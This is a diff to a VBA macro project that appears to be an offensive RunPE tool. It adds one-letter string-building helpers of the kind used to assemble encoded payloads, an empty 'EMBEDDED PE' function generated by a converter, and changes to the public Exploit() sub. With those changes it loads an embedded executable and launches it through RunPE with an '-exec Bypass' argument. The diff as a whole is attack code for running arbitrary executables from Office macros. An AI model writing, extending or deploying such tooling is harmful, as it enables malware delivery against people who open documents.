@@ -430,6 +430,53 @@ Private Function FileToByteArray(strFilename As String) As Byte()
     FileToByteArray = baFileContent
 End Function
 
+' --------------------------------------------------------------------------------
+' Method:    StringToByteArray
+' Desc:      Convert a String to a Byte array
+' Arguments: strContent - Input String representing the PE
+' Returns:   The content of the String as a Byte array
+' --------------------------------------------------------------------------------
+Private Function StringToByteArray(strContent As String) As Byte()
+    ' String to Byte array
+    Dim baContent() As Byte
+    baContent = StrConv(strContent, vbFromUnicode)
+    StringToByteArray = baContent
+End Function
+
+' --------------------------------------------------------------------------------
+' Method:    A
+' Desc:      Append a Char to a String.
+' Arguments: strA - Input String. E.g.: "AAA"
+'            bChar - Input Char as a Byte. E.g.: 66 or &H42
+' Returns:   The concatenation of the String and the Char. E.g.: "AAAB"
+' --------------------------------------------------------------------------------
+Private Function A(strA As String, bChar As Byte) As String
+    A = strA & Chr(bChar)
+End Function
+
+' --------------------------------------------------------------------------------
+' Method:    B
+' Desc:      Append a String to another String.
+' Arguments: strA - Input String 1. E.g.: "AAAA"
+'            strB - Input String 2. E.g.: "BBBB"
+' Returns:   The concatenation of the two Strings. E.g.: "AAAABBBB"
+' --------------------------------------------------------------------------------
+Private Function B(strA As String, strB As String) As String
+    B = strA + strB
+End Function
+
+
+' ================================================================================
+'                                ~~~ EMBEDDED PE ~~~
+' ================================================================================
+
+' CODE GENRATED BY PE2VBA
+Private Function PE() As String
+    Dim strPE As String
+    strPE = ""
+    PE = strPE
+End Function
+
 
 ' ================================================================================
 '                                   ~~~ MAIN ~~~
@@ -668,6 +715,7 @@ Public Sub Exploit()
     
     Dim strSrcFile As String
     Dim strArguments As String
+    Dim strPE As String
     Dim baFileContent() As Byte
     
     'strSrcFile = "C:\Windows\System32\cmd.exe"
@@ -678,15 +726,23 @@ Public Sub Exploit()
     
     strArguments = "-exec Bypass"
     
-    If Dir(strSrcFile) = "" Then
-        Debug.Print ("[-] '" + strSrcFile + "' doesn't exist.")
-        Exit Sub
+    strPE = PE()
+    If strPE = "" Then
+        If Dir(strSrcFile) = "" Then
+            Debug.Print ("[-] '" + strSrcFile + "' doesn't exist.")
+            Exit Sub
+        Else
+            Debug.Print ("[+] Source file: '" + strSrcFile + "'")
+            Debug.Print ("[*] |__ Command line: " + strSrcFile + " " + strArguments)
+        End If
+        baFileContent = FileToByteArray(strSrcFile)
+        Call RunPE(baFileContent, strArguments)
     Else
-        Debug.Print ("[+] Source file: '" + strSrcFile + "'")
-        Debug.Print ("[*] |__ Command line: " + strSrcFile + " " + strArguments)
+        Debug.Print ("[+] Source file: embedded PE")
+        baFileContent = StringToByteArray(strPE)
+        Call RunPE(baFileContent, strArguments)
     End If
-    
-    baFileContent = FileToByteArray(strSrcFile)
-    Call RunPE(baFileContent, strArguments)
-    
+
 End Sub
+
+
